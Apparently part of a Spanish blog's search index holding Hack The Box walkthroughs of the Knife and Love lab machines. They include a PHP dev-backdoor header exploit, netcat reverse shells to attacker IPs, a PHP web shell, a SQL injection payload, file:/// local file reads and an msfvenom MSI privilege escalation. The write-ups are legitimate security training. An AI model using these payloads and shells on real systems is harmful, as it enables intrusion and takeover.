pollution","command injection","kubernetes","kubectl","escaping from the pod"],"title":"Hack The Box - Unobtainium","uri":"https://sckull.github.io/posts/unobtainium/"},{"content":"\rKnife es una maquina de HackTheBox, en esta maquina encontramos que esta utilizando una version en desarrollo de PHP la cual fue afectada con un backdoor, por medio de este logramos ingresar tras ejecutar una shell inversa. Finalmente escalamos privilegios utilizando los permisos de la herramienta Knife con un script en ruby.\nNombre Knife OS Linux Puntos 20 Dificultad Facil IP 10.10.10.242 Maker MrKN16H7\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.4, 3.8, 4.9, 5.1, 6.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} RECON NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.91 scan initiated Wed May 26 19:44:57 2021 as: nmap -Pn -sV -sC -p22,80 -oN scan_ports 10.10.10.242 Nmap scan report for 10.10.10.242 (10.10.10.242) Host is up (0.098s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 26 19:45:11 2021 -- 1 IP address (1 host up) scanned in 13.39 seconds HTTP Encontramos una pagina aparentemente estatica.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, pero solo muestra una direccion ya conocida y otra, que no podemos acceder de formar remota.\n1 2 3 π ~/htb/knife ❯ gobuster dir -u http://10.10.10.242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 30 -x php,html,txt,json,xml /index.php (Status: 200) [Size: 5815] /server-status (Status: 403) [Size: 277] HEADERS En los headers del sitio encontramos PHP/8.1.0-dev, al investigar esta version vemos un exploit que permite la ejecucion de comandos a traves de un Header el cual esta relacionado a un backdoor que recientemente fue detectado en un commit del repositorio de PHP en desarrollo, lo que permite ejecutar comandos de forma remota.\n1 2 3 4 5 HTTP/1.1 200 OK Date: Thu, 27 May 2021 00:22:54 GMT Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/8.1.0-dev Content-Type: text/html; charset=UTF-8 USER - JAMES La ejecucion de comandos se dá tras enviar un comando en el header User-Agentt: zerodiumsystem('whoami'); con lo cual se logra ejecutar comandos y muestra su salida. En la salida de curl vemos la ejecucion del comando whoami al usuario \u0026ldquo;James\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/knife ❯ curl -s http://10.10.10.242/ -H \u0026#34;User-Agentt: zerodiumsystem(\u0026#39;whoami\u0026#39;);\u0026#34;| html2text james * About EMA * / * Patients * / * Hospitals * / * Providers * / * E-MSO ***** At EMA we\u0026#39;re taking care to a whole new level . . . ***** ****** Taking care of our ****** Ejecutamos una shell inversa y logramos obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 8081 \u0026gt;/tmp/f james@knife:/$ whoami whoami james james@knife:/$ cd cd james@knife:~$ ll ll total 40 drwxr-xr-x 5 james james 4096 May 18 13:20 ./ drwxr-xr-x 3 root root 4096 May 6 14:44 ../ lrwxrwxrwx 1 james james 9 May 10 16:23 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 james james 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 james james 3771 Feb 25 2020 .bashrc drwx------ 2 james james 4096 May 6 14:45 .cache/ drwxrwxr-x 3 james james 4096 May 6 16:32 .local/ -rw-r--r-- 1 james james 807 Feb 25 2020 .profile -rw-rw-r-- 1 james james 66 May 7 14:16 .selected_editor drwx------ 2 james james 4096 May 18 13:20 .ssh/ -r-------- 1 james james 33 May 26 20:25 user.txt james@knife:~$ cat user.txt cat user.txt 7b3e1804cce95710f8730ca6fb1a086f james@knife:~$ PRIVILEGE ESCALATION Ejecutando sudo -l -l vemos que tenemos permisos root (sudo) para ejecutar el comando knife.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 james@knife:~$ sudo -l -l Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on knife: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/knife james@knife:~$ file /usr/bin/knife /usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife james@knife:~$ file /opt/chef-workstation/bin/knife /opt/chef-workstation/bin/knife: a /opt/chef-workstation/embedded/bin/ruby --disable-gems script, ASCII text executable james@knife:~$ ls -lah /opt/chef-workstation/bin/knife -rwxr-xr-x 1 root root 12K Feb 15 22:06 /opt/chef-workstation/bin/knife james@knife:~$ Utilizamos knife exec con un script para obtener una shell root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 james@knife:~$ echo \u0026#34;system(\u0026#39;/bin/bash\u0026#39;)\u0026#34; \u0026gt; script.rb james@knife:~$ cat script.rb system(\u0026#39;/bin/bash\u0026#39;) james@knife:~$ sudo /usr/bin/knife exec script.rb root@knife:/home/james# whoami root root@knife:/home/james# id uid=0(root) gid=0(root) groups=0(root) root@knife:/home/james# cd root@knife:~# ll total 56 drwx------ 7 root root 4096 May 18 13:26 ./ drwxr-xr-x 20 root root 4096 May 18 13:25 ../ lrwxrwxrwx 1 root root 9 May 8 16:43 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3137 May 7 11:12 .bashrc drwx------ 2 root root 4096 May 7 14:47 .cache/ drwx------ 3 root root 4096 May 18 13:20 .chef/ -rwxr-xr-x 1 root root 105 May 8 16:46 delete.sh* drwxr-xr-x 3 root root 4096 May 7 11:13 .local/ -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw------- 1 root root 1024 May 8 11:13 .rnd -r-------- 1 root root 33 May 26 20:25 root.txt -rw-r--r-- 1 root root 66 May 8 16:46 .selected_editor drwxr-xr-x 3 root root 4096 May 6 14:44 snap/ drwx------ 2 root root 4096 May 6 14:44 .ssh/ -rw------- 1 root root 2413 May 18 13:25 .viminfo root@knife:~# cat root.txt e2eee2ca199ac8ea06e9578969576706 root@knife:~# ","description":"Knife es una maquina de HackTheBox, en esta maquina encontramos que esta utilizando una version en desarrollo de PHP la cual fue afectada con un backdoor, por medio de este  logramos ingresar tras ejecutar una shell inversa. Finalmente escalamos privilegios utilizando los permisos de la herramienta Knife con un script en ruby. ","id":52,"section":"posts","tags":["php","backdoor","knife tool","ruby"],"title":"Hack The Box - Knife","uri":"https://sckull.github.io/posts/knife/"},{"content":"\rEn Love encontramos un escaner de archivos sin ningun tipo de filtro para archivos locales, tambien, un sistema de votos en donde vemos credenciales lo que nos dio acceso por WinRM. Para escalar privilegios se muestran dos formas, ambas aprovechando la \u0026lsquo;politica\u0026rsquo; AlwaysInstallElevated.\nNombre Love OS Windows Puntos 20 Dificultad Facil IP 10.10.10.239 Maker pwnmeow\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.8, 4.7, 5.2, 4.8, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 8, 5, 5, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} RECON NMAP Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80, 5000), https (443), smb (139, 445), mysql (3306), winrm (5985).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 # Nmap 7.91 scan initiated Sat May 8 09:26:12 2021 as: nmap -Pn -p80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN port_scan 10.10.10.239 Nmap scan report for 10.10.10.239 (10.10.10.239) Host is up (0.088s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | FourOhFourRequest, JavaRMI, Kerberos, LDAPBindReq, NULL, NotesRPC, RPCCheck, SIPOptions, SMBProgNeg, WMSRequest: |_ Host \u0026#39;10.10.14.18\u0026#39; is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 5040/tcp open unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=LOVE | Subject Alternative Name: DNS:LOVE, DNS:Love | Not valid before: 2021-04-11T14:39:19 |_Not valid after: 2024-04-10T14:39:19 |_ssl-date: 2021-05-08T14:01:10+00:00; +32m03s from scanner time. | tls-alpn: |_ http/1.1 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : [... ... ...] Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h17m03s, deviation: 3h30m01s, median: 32m02s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-05-08T07:00:57-07:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-08T14:00:55 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 8 09:29:08 2021 -- 1 IP address (1 host up) scanned in 176.06 seconds SSLSCAN Tras ejecutar sslscan vemos un subdmonio y dominio principal.\n1 2 3 4 5 6 7 8 9 10 11 λ ~/htb/love sslscan 10.10.10.239|tail SSL Certificate: Signature Algorithm: sha256WithRSAEncryption RSA Key Strength: 2048 Subject: staging.love.htb Issuer: staging.love.htb Not valid before: Jan 18 14:00:16 2021 GMT Not valid after: Jan 18 14:00:16 2022 GMT HTTP Encontramos una pagina estatica en el dominio principal love.htb que muestra un login de un sistema de votos.\nEn el subdominio staging.love.htb vemos una herramienta que permite escanear archivos mediante una url.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, pero no encontramos mucho.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 λ ~/htb/love gobuster dir -u http://staging.love.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt,xml /index.php (Status: 200) [Size: 5357] /Index.php (Status: 200) [Size: 5357] /beta.php (Status: 200) [Size: 4997] /examples (Status: 503) [Size: 406] /licenses (Status: 403) [Size: 425] /INDEX.php (Status: 200) [Size: 5357] /Beta.php (Status: 200) [Size: 4997] λ ~/htb/love gobuster dir -u http://love.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt,xml /index.php (Status: 200) [Size: 4388] /login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /images (Status: 301) [Size: 330] [--\u0026gt; http://love.htb/images/] /Images (Status: 301) [Size: 330] [--\u0026gt; http://love.htb/Images/] /admin (Status: 301) [Size: 329] [--\u0026gt; http://love.htb/admin/] /plugins (Status: 301) [Size: 331] [--\u0026gt; http://love.htb/plugins/] /includes (Status: 301) [Size: 332] [--\u0026gt; http://love.htb/includes/] /dist (Status: 301) [Size: 328] [--\u0026gt; http://love.htb/dist/] /IMAGES (Status: 301) [Size: 330] [--\u0026gt; http://love.htb/IMAGES/] FILE READ La herramienta acepta direcciones url y las \u0026ldquo;escanea\u0026rdquo; aunque no tiene algun tipo de filtro para la lectura de archivos locales, utilizamos file:/// para realizar la lectura de archivos de la maquina, en este caso el archivo etc/hosts, con ello sabemos que podemos leer archivos locales.\nPHOEBE - USER En el login del sistema de votacion, enviamos una solicitud para ingresar, interceptamos, manipulamos la solicitud con burpsuite (agregando \u0026rsquo; inicialmente), vemos la direccion de los archivos del sistema de votacion: C:\\xampp\\htdocs\\omrs.\nSQLI Guardamos la solicitud y utilizamos sqlmap para intentar una inyeccion SQL, logramos obtener las credenciales del usuario admin, pero no crackear el hash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 --- Parameter: voter (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: voter=IDVOTER\u0026#39; AND (SELECT 8908 FROM (SELECT(SLEEP(5)))Msjv)-- OaEC\u0026amp;password=PASSWORD\u0026amp;login= --- available databases [6]: [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] test [*] votesystem Database: votesystem Table: admin [1 entry] +----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+ | id | photo | lastname | password | username | firstname | created_on | +----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+ | 1 | facebook-profile-image.jpeg | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin | Neovic | 2018-04-02 | +----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+ DATABASE CREDS Con la direccion C:\\xampp\\htdocs\\omrs logramos obtener el codigo fuente del sistema de votacion de index.php el cual nos mostró la direccion del archivo con las credenciales de la base de datos includes/conn.php, asi mismo pudimos realizar la lectura de la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // curl -s \u0026#34;http://staging.love.htb/beta.php\u0026#34; -d \u0026#34;file=file:///C:\\xampp\\htdocs\\omrs\\login.php\u0026amp;read=Scan file\u0026#34;|html2text \u0026lt;?php session_start(); include \u0026#39;includes/conn.php\u0026#39;; if(isset($_POST[\u0026#39;login\u0026#39;])){ $voter = $_POST[\u0026#39;voter\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $sql = \u0026#34;SELECT * FROM voters WHERE voters_id = \u0026#39;$voter\u0026#39;\u0026#34;; $query = $conn-\u0026gt;query($sql); if($query-\u0026gt;num_rows \u0026lt; 1){ $_SESSION[\u0026#39;error\u0026#39;] = \u0026#39;Cannot find voter with the ID\u0026#39;; } else{ $row = $query-\u0026gt;fetch_assoc(); if(password_verify($password, $row[\u0026#39;password\u0026#39;])){ $_SESSION[\u0026#39;voter\u0026#39;] = $row[\u0026#39;id\u0026#39;]; } else{ $_SESSION[\u0026#39;error\u0026#39;] = \u0026#39;Incorrect password\u0026#39;; } } } else{ $_SESSION[\u0026#39;error\u0026#39;] = \u0026#39;Input voter credentials first\u0026#39;; } header(\u0026#39;location: index.php\u0026#39;); ?\u0026gt; // curl -s \u0026#34;http://staging.love.htb/beta.php\u0026#34; -d \u0026#34;file=file:///C:\\xampp\\htdocs\\omrs\\includes/conn.php\u0026amp;read=Scan file\u0026#34;|html2text \u0026lt;?php $conn = new mysqli(\u0026#39;localhost\u0026#39;, \u0026#39;phoebe\u0026#39;, \u0026#39;HTB#9826^(_\u0026#39;, \u0026#39;votesystem\u0026#39;); if ($conn-\u0026gt;connect_error) { die(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error); } ?\u0026gt; // curl -s \u0026#34;http://staging.love.htb/beta.php\u0026#34; -d \u0026#34;file=file:///c:/Users/phoebe/Desktop/user.txt\u0026amp;read=Scan file\u0026#34;|html2text 0e4ce40541358a6518263cff2770a701 SHELL - WINRM Utilizamos las credenciales encontradas con Evil-WinRM, logramos obtener una shell con el usuario phoebe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 λ ~/htb/love evil-winrm -i love.htb -u phoebe -p \u0026#39;HTB#9826^(_\u0026#39; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; whoami love\\phoebe *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\Phoebe\\Desktop\u0026gt; dir Directory: C:\\Users\\Phoebe\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 5/7/2021 11:44 AM 34 user.txt *Evil-WinRM* PS C:\\Users\\Phoebe\\Desktop\u0026gt; type user.txt 0e4ce40541358a6518263cff2770a701 *Evil-WinRM* PS C:\\Users\\Phoebe\\Desktop\u0026gt; Enumerando los archivos de configuracion encontramos una contraseña relacionada al dominio www.love.htb, pero al intentar acceder a este puerto, aparece con permiso no autorizado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 *Evil-WinRM* PS C:\\xampp\\apache\\conf\\extra\u0026gt; cat httpd-vhosts.conf| select-string -notmatch \u0026#34;#\u0026#34; \u0026lt;VirtualHost *:5000\u0026gt; DocumentRoot \u0026#34;C:/xampp/htdocs/passwordmanager\u0026#34; ServerName www.love.htb ServerAlias www.love.htb ErrorLog \u0026#34;logs/passwordmanager-error.log\u0026#34; CustomLog \u0026#34;logs/passwordmanager-access.log\u0026#34; common \u0026lt;Directory \u0026#34;C:/xampp/htdocs/passwordmanager\u0026#34;\u0026gt; Options All AllowOverride All Order Deny,Allow Allow from 127.0.0.0/255.0.0.0 ::1/128 Allow from 127.0.0.1 Deny from All Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026#34;C:/xampp/htdocs/omrs\u0026#34; ServerName love.htb ServerAlias love.htb ErrorLog \u0026#34;logs/omrs-error.log\u0026#34; CustomLog \u0026#34;logs/omrs-access.log\u0026#34; common \u0026lt;Directory \u0026#34;C:/xampp/htdocs/omrs\u0026#34;\u0026gt; Order allow,deny Allow from all Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026#34;C:/xampp/htdocs/FFS\u0026#34; ServerName staging.love.htb ServerAlias staging.love.htb ErrorLog \u0026#34;logs/ffs-error.log\u0026#34; CustomLog \u0026#34;logs/ffs-access.log\u0026#34; common \u0026lt;Directory \u0026#34;C:/xampp/htdocs/FFS\u0026#34;\u0026gt; Order allow,deny Allow from all Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; *Evil-WinRM* PS C:\\xampp\\apache\\conf\\extra\u0026gt; *Evil-WinRM* PS C:\\xampp\\apache\\conf\\extra\u0026gt; dir C:/xampp/htdocs/passwordmanager Directory: C:\\xampp\\htdocs\\passwordmanager Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/12/2021 12:25 PM 45 creds.txt -a---- 1/27/2021 5:32 PM 4720 index.php *Evil-WinRM* PS C:\\xampp\\apache\\conf\\extra\u0026gt; cat C:/xampp/htdocs/passwordmanager/creds.txt Vote Admin Creds admin: @LoveIsInTheAir!!!! SYSTEM Ejecutamos PowerUp el cual nos mostro que esta activado AlwaysInstallElevated.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; powershell.exe -nop -exec bypass -c \u0026#34;Import-Module .\\power.ps1; Invoke-AllChecks\u0026#34; [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... [*] Checking service executable and argument permissions... [*] Checking service permissions... [*] Checking %PATH% for potentially hijackable .dll locations... HijackablePath : C:\\Users\\Phoebe\\AppData\\Local\\Microsoft\\WindowsApps\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Users\\Phoebe\\AppData\\Local\\Microsoft\\WindowsApps\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; [*] Checking for AlwaysInstallElevated registry key... OutputFile : AbuseFunction : Write-UserAddMSI [*] Checking for Autologon credentials in registry... DefaultDomainName : LOVE DefaultUserName : phoebe DefaultPassword : AltDefaultDomainName : AltDefaultUserName : AltDefaultPassword : [*] Checking for vulnerable registry autoruns and configs... [*] Checking for vulnerable schtask files/configs... [*] Checking for unattended install files... [*] Checking for encrypted web.config strings... [*] Checking for encrypted application pool and virtual directory passwords... Intentamos realizar la instalacion de UserAdd.msi de PowerUp pero segun parece no es posible mediante winrm, por lo que buscamos alternativas para ejecutar comandos, encontramos dos, mediante una shell simple y metasploit.\n1 2 3 4 5 6 7 8 *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; powershell.exe -nop -exec bypass -c \u0026#34;Import-Module .\\power.ps1;Write-UserAddMSI\u0026#34; OutputPath ---------- UserAdd.msi *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; cmd.exe /c msiexec /quiet /qn /i C:\\Users\\Phoebe\\Documents\\UserAdd.msi The Windows Installer Service could not be accessed. This can occur if the Windows Installer is not correctly installed. Contact your support personnel for assistance. SIMPLE SHELL Verificamos que tenemos permisos en el directorio de omrs de Voting System.\n1 2 3 4 5 6 7 8 9 *Evil-WinRM* PS C:\\xampp\\htdocs\\omrs\u0026gt; icacls C:\\xampp\\htdocs\\omrs C:\\xampp\\htdocs\\omrs Everyone:(I)(OI)(CI)(RX) BUILTIN\\Administrators:(I)(OI)(CI)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) NT AUTHORITY\\Authenticated Users:(I)(M) NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(IO)(M) Successfully processed 1 files; Failed processing 0 files Creamos un archivo para ejecucion de una shell inversa en php utilizando netcat en un servidor de samba local, subimos este archivo al directorio de omrs y ejecutamos un servidor samba.\n1 2 3 4 5 6 7 8 9 10 11 λ ~/htb/love cat sc.php \u0026lt;?php system(\u0026#34;\\\\\\\\10.10.14.17\\\\share\\\\nc.exe -e cmd.exe 10.10.14.17 80\u0026#34;); ?\u0026gt; λ ~/htb/love sudo impacket-smbserver share . Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed \u0026ldquo;Ejecutamos\u0026rdquo; la shell visitando la direccion sc.php, logramos obtener una shell, intentamos ejecutar el archivo UserAdd.msi pero este no agregaba el usuario por lo que creamos un archivo .msi utilizando msfvenom para ejecutar una shell inversa: msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f msi -o setup.msi.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #curl -s http://love.htb/sc.php λ ~ sudo nc -lvvp 80 listening on [any] 80 ... connect to [10.10.14.17] from love.htb [10.10.10.239] 55250 Microsoft Windows [Version 10.0.19042.867] (c) 2020 Microsoft Corporation. All rights reserved. C:\\xampp\\htdocs\\omrs\u0026gt;cd C:\\Users\\Phoebe\\Documents cd C:\\Users\\Phoebe\\Documents C:\\Users\\Phoebe\\Documents\u0026gt;msiexec /quiet /qn /i setup.msi msiexec /quiet /qn /i setup.msi C:\\Users\\Phoebe\\Documents\u0026gt; SYSTEM Tras ejecutar el archivo logramos obtener una shell NT AUTHORITY\\SYSTEM y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # setup.msi Execution. λ ~/htb/love sudo nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.17] from love.htb [10.10.10.239] 55253 Microsoft Windows [Version 10.0.19042.867] (c) 2020 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u0026gt;whoami whoami nt authority\\system C:\\WINDOWS\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt type C:\\Users\\Administrator\\Desktop\\root.txt 1da3f3319ea544754245556467579d12 